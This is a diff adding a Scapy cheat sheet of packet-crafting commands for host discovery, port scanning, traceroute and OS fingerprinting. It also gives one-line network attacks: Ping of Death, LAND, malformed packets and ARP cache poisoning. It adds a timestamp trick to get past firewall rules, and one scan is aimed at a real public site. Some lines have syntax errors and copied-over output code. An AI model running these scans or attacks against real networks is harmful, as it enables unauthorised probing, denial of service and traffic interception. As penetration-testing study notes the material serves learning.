@@ -1,0 +1,172 @@
+#########################
+### (1) TCP[Flag=SYN] ###
+#########################
+ans, unans = sr(IP(dst="www.slashdot.org")/TCP(dport=[80,666],flags="A"))
+
+# Find UNFILTERED-PORTS, in answered packets:
+for s,r in ans:
+	if s[TCP].dport == r[TCP].sport:
+		print("%d is unfiltered" % s[TCP].dport)
+
+# Find FILTERED-PORTS, in unanswered packets
+for s in unans:
+	print("%d is filtered" % s[TCP].dport)
+
+#####################
+### (2) XMAS Scan ###
+#####################
+ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU"))
+# Check TCP[Flag=RST]-RESPONSE Packets to discover CLOSED-PORTS on Target
+
+###################
+### (3) IP Scan ###
+###################
+ans, unans = sr(IP(dst="192.168.1.1",proto=(0,255))/"SCAPY",retry=2)
+
+####################
+### (4) ARP Ping ###
+####################
+# Fastest method for HOST-DISCOVERY on local ethernet network
+ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
+
+# Review RESPONSE Packets
+ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%"))
+
+# Scapy includes BUILT-IN-arping()-FUNCTION - Performs similarly to 2 above commands
+arping("192.168.1.*")
+
+#####################
+### (5) ICMP Ping ###
+#####################
+ans, unans = sr(IP(dst="192.168.1.1-254")/ICMP())
+
+# REQUEST to collect data on live-hosts
+######## Not sure what this really does #######
+ans.summary(lambda (s,r): r.sprintf("%IP.src% is alive"))
+
+####################
+### (6) TCP Ping ###
+####################
+# IF:
+#	- ICMP-Echo REQUEST Packets are blocked
+# 	THEN:	Use TCP[Flag=SYN]-Ping
+ans, unans = sr(IP(dst="192.168.1.*")/TCP(dport=80,flags="S"))
+
+# Any RESPONSE Packets to this TCP[Flag=SYN]-Ping REQUEST Packet indicate a Live-Host
+ans.summary(lambda(s,r) : r.sprintf("%IP.src% is alive"))
+
+####################
+### (7) UDP Ping ###
+####################
+# IF:
+#	- Everything fails
+#	THEN:	UDP-PING REQUEST Packet, will produce: ICMP PORT UNREACHABLE Error from Live Host
+#			- Pick any port most likely to be CLOSED (EX: Port 0)
+ans, unans = sr(IP(dst="192.168.*.1-10")/UDP(dport=0))
+
+# Review RESPONSE Packets
+ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%"))
+
+#############################
+### (8) Malformed Packets ###
+#############################
+send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
+
+#########################
+### (9) PING of Death ###
+#########################
+send(fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)))
+
+########################
+### (10) LAND Attack ###
+########################
+send(IP(src="<kali_attacker>",dst="<target>")/TCP(sport=135,dport=135))
+
+################################
+### (11) ARP Cache Poisoning ###
+################################
+send(Ether(dst=<client_MAC>/ARP(op="who-has",psrc=gateway,pdst=client),inter=RandNum(10,40),loop=1)
+
+##########################
+### (12) TCP Port Scan ###
+##########################
+# Send TCP[Flag=SYN] REQUEST Packet to each port on target
+# Wait for TCP[Flag=SYNACK] || TCP[Flag=RST] || ICMP-Error
+res, unans = sr(IP(dst="target")/TCP(flags="S",dport=(1,1024))) 
+
+# Possible result visualization:	OPEN Ports
+res.nsummary(lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)))
+
+#####################################
+### (13) TCP[Flag=SYN] TRACEROUTE ###
+#####################################
+ans, unans = sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))
+
+# To get results
+ans.summary(lambda(s,r):r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags}"))
+
+###########################
+### (14) UDP TRACEROUTE ###
+###########################
+# Because there is no session-establishment for UDP, we need to provide an Application-Payload for the request (i.e. DNS, ISAKMP, NTP, etc.) to receive an answer
+res, unans = sr(IP(dst="<target_IP>", ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname="test.com"))
+
+# Visualize results as a list of routers
+res.make_table(lambda (s,r):(s.dst,s.ttl,r.src))
+
+####################################
+### (15) TCP TIMESTAMP FILTERING ###
+####################################
+
+# PROBLEM:
+#	Many firewalls include a rule:	DROPS TCP-Packets that !have TCP-TIMESTAMP-Option defined (Common in many PORT-SCANNERS)
+# SOLUTION:
+#	Define additional Options to allow Scapy generated packets to reach DST
+sr1(IP(dst="<DST.IP>")/TCP(dport=80,flags="S",options=[('Timestamp',(0,0))]))
+
+##############################
+### (16) OS FINGERPRINTING ###
+##############################
+
+#############################################
+#	a) ISN: Initial Sequence Number     #
+#############################################
+###					- Scapy can be used to analyze ISN-Increments to discover vulnerable systems
+###						1st) Collect TARGET-Responses, via:	Sending TCP[Flag=SYN] Packets in a loop for probing
+ans, unans = srloop(IP(dst="192.168.1.1")/TCP(dport=80,flags="S"))
+
+###						2nd) Once we obtain a reasonable number of TCP[Flag=SYNACK]-RESPONSE Packets, we can start analyzing the collected data
+temp = 0
+for s, r in ans:
+	temp = r[TCP].seq - temp
+	print("%d\t+%d" % (r[TCP].seq, temp))
+
+##########################
+#	b) nmap_fp       #
+##########################
+###						1st) Ensure nmap-extension module is loaded
+load_module("nmap")
+###						2nd) Ensure nmap-signature-database is located in the correct path, as indicated by the command below
+conf.nmap_base
+
+######################
+#	c) p0f       #
+######################
+#					- IF: 'p0f' is installed on system, we can use it to guess OS-Name & OS-Version from Scapy (uses SYN-DB)
+###						1st) Ensure 'p0f'-DB exists in the path as indicated by the command below
+conf.p0f_base
+###						2nd) Guess OS from a single captured packet
+sniff(prn=prnp0f)
+
+####################################
+### VIEWING PACKETS W/ WIRESHARK ###
+####################################
+
+# PROBLEM:
+#	View generated | sniffed Scapy Packets w/ WIRESHARK (advanced packet dissection)
+# SOLUTION:
+#	Implementation of 'wireshark()'-FUNCTION
+packets = Ether()/IP(dst=Net("google.com/30"))/ICMP()#  1ST: Generates some packets
+wireshark(packets)#					2ND: Show generated packets in WIRESHARK
+# Wireshark is initiated in the background to show packets
+### NOTE: ###	Scapy can be told where to find the Wireshark-Executable:	Change the 'conf.prog.wireshark' configuration setting
